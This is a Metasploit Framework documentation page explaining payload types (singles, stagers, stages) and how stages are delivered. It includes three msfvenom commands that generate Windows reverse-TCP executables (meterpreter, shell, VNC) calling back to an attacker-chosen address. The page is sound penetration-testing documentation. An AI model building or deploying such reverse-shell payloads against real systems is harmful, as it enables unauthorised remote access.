<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
<head>
  <meta charset="utf-8" />
  <meta name="generator" content="pandoc" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
  <meta name="author" content="Metasploit Versions 4,5" />
  <title>How Payloads Work</title>
  <style>
    code{white-space: pre-wrap;}
    span.smallcaps{font-variant: small-caps;}
    span.underline{text-decoration: underline;}
    div.column{display: inline-block; vertical-align: top; width: 50%;}
    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
    ul.task-list{list-style: none;}
  </style>
  <link rel="stylesheet" href="../styles.css" />
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,400;0,700;1,300;1,400&display=swap" />
  <!--[if lt IE 9]>
    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
  <![endif]-->
  <nav class="right">
    <ul>
      <li style="display: inline;"> <a href="https://github.com/rapid7/metasploit-framework/tree/master/documentation/modules">Module Docs</a></li>
      <li style="display: inline;"><a href="https://rapid7.github.io/metasploit-framework/api/">API</a></li>
    </ul>
  </nav>
</head>
<body>

<div id="main-outer-box">

<div id="my-header">
  <a href="../index.html">Metasploit Framework</a>
</div>

<div id="trunk-box">

<div id="nav-box">
<p>Contents:</p>
<ul>
<li><a href=".././markdown-cheat-sheet.html">Markdown Cheat Sheet</a></li>
<li>Getting-Started/
<ul>
<li><a href=".././Getting-Started/setting-up-metasploit-dev-enviroment.html">Setting up a Metasploit Developer Environment</a></li>
</ul></li>
<li>Utilities/
<ul>
<li><a href=".././Utilities/complier-windows-c.html">How to use Metasploit Framework Compiler Windows to compile C code</a></li>
<li><a href=".././Utilities/oracle-support-kali-linux.html">Oracle Support working with Kali Linux</a></li>
</ul></li>
<li>Modules/
<ul>
<li><a href=".././Modules/modules.html">Some stuff about modules</a></li>
<li>How-To/
<ul>
<li><a href=".././Modules/How-To/login-scanner.html">Create a Login Scanner Module</a></li>
<li><a href=".././Modules/How-To/http-login-scanner.html">How to write a HTTP LoginScanner Module</a></li>
</ul></li>
<li><a href=".././Modules/get-started-writing-post-module.html">Get started with writing a post module</a></li>
<li><a href=".././Modules/get-started-writing-auxillary-module.html">Get started with writing an auxiliary module</a></li>
<li><a href=".././Modules/module-reference-identifiers.html">Module Reference Identifiers</a></li>
</ul></li>
<li>Exploits/
<ul>
<li><a href=".././Exploits/writing-exploits.html">Get Started Writing an Exploit</a></li>
<li><a href=".././Exploits/exploit-ranking.html">Exploit Ranking</a></li>
</ul></li>
<li>Meterpreter/
<ul>
<li><a href="about-meterpreter.html">About Meterpreter</a></li>
<li><a href="meterpreter-configuration.html">Meterpreter Configuration</a></li>
<li><strong>How Payloads Work</strong></li>
<li><a href="transport-control.html">Transport Control</a></li>
<li><a href="debugging-dead-sessions.html">Debugging Dead Meterpreter Sessions</a></li>
<li><a href="payload-debugging.html">Payload Debugging</a></li>
</ul></li>
<li>Evasion-and-Obfuscation/
<ul>
<li><a href=".././Evasion-and-Obfuscation/obfuscation-crandomizer.html">Metasploit Framework</a></li>
</ul></li>
</ul>

</div>

<div id="article-box">

<div id="header-nav-bar">
<div><a href="meterpreter-configuration.html">←prev</a></div><div class="nav-bar-push"><a href="transport-control.html">next→</a></div>
</div>

<div id="article-content">
<header id="title-block-header">
<h1 class="title">How Payloads Work</h1>
<p class="author">Metasploit Versions 4,5</p>
</header>
<nav id="TOC" role="doc-toc">
<ul>
<li><a href="#singles">Singles</a></li>
<li><a href="#stagers">Stagers</a></li>
<li><a href="#stages">Stages</a></li>
<li><a href="#delivering-stages">Delivering stages</a></li>
</ul>
</nav>
<p>Payload modules are stored in <code>modules/payloads/{singles,stages,stagers}/&lt;platform&gt;</code>. When the framework starts up, stages are combined with stagers to create a complete payload that you can use in exploits. Then, handlers are paired with payloads so the framework will know how to create sessions with a given communications mechanism.</p>
<p>Payloads are given reference names that indicate all the pieces, like so: - Staged payloads: <code>&lt;platform&gt;/[arch]/&lt;stage&gt;/&lt;stager&gt;</code> - Single payloads: <code>&lt;platform&gt;/[arch]/&lt;single&gt;</code></p>
<p>This results in payloads like <code>windows/x64/meterpreter/reverse_tcp</code>. Breaking that down, the platform is <code>windows</code>, the architecture is <code>x64</code>, the final stage we’re delivering is <code>meterpreter</code>, and the stager delivering it is <code>reverse_tcp</code>.</p>
<p>Note that architecture is optional because in some cases it is either unnecessary or implied. An example is <code>php/meterpreter/reverse_tcp</code>. Arch is unneeded for PHP payloads because we’re delivering interpreted code rather than native.</p>
<h3 id="singles">Singles</h3>
<p>Single payloads are fire-and-forget. They can create a communications mechanism with Metasploit, but they don’t have to. An example of a scenario where you might want a single is when the target has no network access – a fileformat exploit delivered via USB key is still possible.</p>
<h3 id="stagers">Stagers</h3>
<p>Stagers are a small stub designed to create some form of communication and then pass execution to the next stage. Using a stager solves two problems. First, it allows us to use a small payload initially to load up a larger payload with more functionality. Second, it makes it possible to separate the communications mechanism from the final stage so one payload can be used with multiple transports without duplicating code.</p>
<h3 id="stages">Stages</h3>
<p>Since the stager will have taken care of dealing with any size restrictions by allocating a big chunk of memory for us to run in, stages can be arbitrarily large. One advantage of that is the ability to write final-stage payloads in a higher-level language like C.</p>
<h2 id="delivering-stages">Delivering stages</h2>
<ol type="1">
<li>The IP address and port you want the payload to connect back to are embedded in the stager. As discussed above, all staged payloads are no more than a small stub that sets up communication and executes the next stage. When you create an executable using a staged payload, you’re really just creating the stager. So the following commands would create functionally identical exe files:</li>
</ol>
<pre><code>    msfvenom -f exe LHOST=192.168.1.1 -p windows/meterpreter/reverse_tcp
    msfvenom -f exe LHOST=192.168.1.1 -p windows/shell/reverse_tcp
    msfvenom -f exe LHOST=192.168.1.1 -p windows/vncinject/reverse_tcp</code></pre>
<p>(Note that these are <em>functionally</em> identical – there is a lot of randomization that goes into it so no two executables are exactly the same.)</p>
<ol type="1">
<li>The Ruby side acts as a client using whichever transport mechanism was set up by the stager (e.g.: tcp, http, https).
<ul>
<li>In the case of a shell stage, Metasploit will connect the remote process’s stdio to your terminal when you interact with it.</li>
<li>In the case of a [[Meterpreter]] stage, Metasploit will begin speaking the Meterpreter wire protocol.</li>
</ul></li>
</ol>

</div> <!-- article-content -->

<div id="footer-nav-bar">
<div><a href="meterpreter-configuration.html">←prev</a></div><div class="nav-bar-push"><a href="transport-control.html">next→</a></div>
</div>

</div> <!-- article-box -->

</div> <!-- trunk-box -->

<div id="my-footer">
<p>Copyright <a href="https://metasploit.com/">Metasploit</a>, 2020</p>
<p><a href="https://join.slack.com/t/metasploit/shared_invite/enQtOTMxMjg5ODY3NDYxLTYyZTVlNDM1ZTI3ZGQ0YTQ0NmI1YjgxMGEwYzFhOWNiZWQ4NDNmNTE1MWNiYzJhMzgwMGY0ZWY2NTY0MjA2M2I">Slack team - metasploit.slack.com</a></p>
<p><a href="https://twitter.com/metasploit">#twitter handle - @metasploit</a></p>
<p><a href="mailto:msfdev@metasploit.com">development questions - msfdev [ @ ] metasploit.com</a></p><br/>
<a href="how-payloads-work.md">Pandoc-Markdown source for this page</a><br/>
(Docs processed by
<a href="http://www.unexpected-vortices.com/sw/rippledoc/index.html">Rippledoc</a>.)
</div> <!-- my-footer -->

</div> <!-- main-outer-box -->

</body>
</html>
